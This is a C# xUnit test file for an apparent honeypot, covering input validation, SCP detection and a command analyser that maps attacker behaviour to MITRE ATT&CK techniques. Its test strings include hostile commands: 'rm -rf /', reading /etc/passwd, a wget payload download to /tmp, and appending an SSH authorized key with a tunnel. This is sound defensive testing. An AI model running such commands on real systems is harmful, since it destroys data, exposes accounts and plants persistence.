using Xunit;

namespace FunnyPot.Tests;

public class InputValidatorTests
{
    [Fact]
    public void Validate_NullInput_ReturnsFalse()
    {
        var result = InputValidator.Validate(null!);
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_EmptyInput_ReturnsFalse()
    {
        var result = InputValidator.Validate("");
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_WhitespaceInput_ReturnsTrue()
    {
        var result = InputValidator.Validate("   ");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ExceedsMaxLength_ReturnsFalse()
    {
        var longInput = new string('a', InputValidator.MaxInputLength + 1);
        var result = InputValidator.Validate(longInput);
        Assert.False(result.isValid);
        Assert.Contains("Input too long", result.error);
    }

    [Fact]
    public void Validate_AtMaxLength_ReturnsTrue()
    {
        var sb = new System.Text.StringBuilder(InputValidator.MaxInputLength);
        for (int i = 0; i < InputValidator.MaxInputLength; i++)
            sb.Append(i % 2 == 0 ? 'a' : 'b');
        var result = InputValidator.Validate(sb.ToString());
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ContainsNullByte_ReturnsFalse()
    {
        var input = "test\0data";
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Binary content not allowed", result.error);
    }

    [Fact]
    public void Validate_NoNullBytes_ReturnsTrue()
    {
        var result = InputValidator.Validate("正常输入");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_RepetitiveCharsExceedsLimit_ReturnsFalse()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars + 1);
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Repetitive input detected", result.error);
    }

    [Fact]
    public void Validate_ValidRepetitiveInput_ReturnsTrue()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars);
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_NormalCommand_ReturnsTrue()
    {
        var result = InputValidator.Validate("ls -la /home");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ValidLongInput_ReturnsTrue()
    {
        var input = "ls -la /home/user/documents/projects/codebase/src/modules/utilities/helpers/";
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }
}

public class SCPDetectorTests
{
    [Theory]
    [InlineData("scp", true)]
    [InlineData("SCP", true)]
    [InlineData("scp -t somefile", true)]
    [InlineData("scp -f somefile", true)]
    [InlineData("sftp", true)]
    [InlineData("SFTP", true)]
    [InlineData("ls -la", false)]
    [InlineData("cat file.txt", false)]
    [InlineData("cd /home", false)]
    [InlineData("rm -rf /", false)]
    [InlineData("git commit -m 'fix'", false)]
    [InlineData("grep -r 'foo' .", false)]
    [InlineData("tar -cf archive.tar .", false)]
    public void IsSCPCommand_DetectsCorrectly(string input, bool expected)
    {
        var result = SCPDetector.IsSCPCommand(input);
        Assert.Equal(expected, result);
    }
}

public class DataHarvesterTests
{
    [Fact]
    public void LevenshteinDistance_DetectsPasswordMutation()
    {
        var distance = DataHarvester.LevenshteinDistance("root:password1", "root:password2");
        Assert.Equal(1, distance);
    }

    [Fact]
    public void AnalyzeCommand_ExtractsPayloadAndDiscoverySignals()
    {
        var analysis = DataHarvester.AnalyzeCommand("cat /etc/passwd; wget http://example.com/a.sh -O /tmp/a.sh");

        Assert.Equal(1, analysis.DiscoveryDepthScore);
        Assert.Contains("http://example.com/a.sh", analysis.PayloadUrls);
        Assert.Contains("T1105", analysis.MitreAttackTechniques);
        Assert.Contains("T1083", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DetectsPersistenceAndTunneling()
    {
        var analysis = DataHarvester.AnalyzeCommand("echo key >> ~/.ssh/authorized_keys && ssh -D 1080 host");

        Assert.Equal("ssh_authorized_keys", analysis.PersistenceVector);
        Assert.Equal("dynamic_forward", analysis.TunnelingIntent);
        Assert.True(analysis.AssetValuePerceptionScore > 0);
    }
}
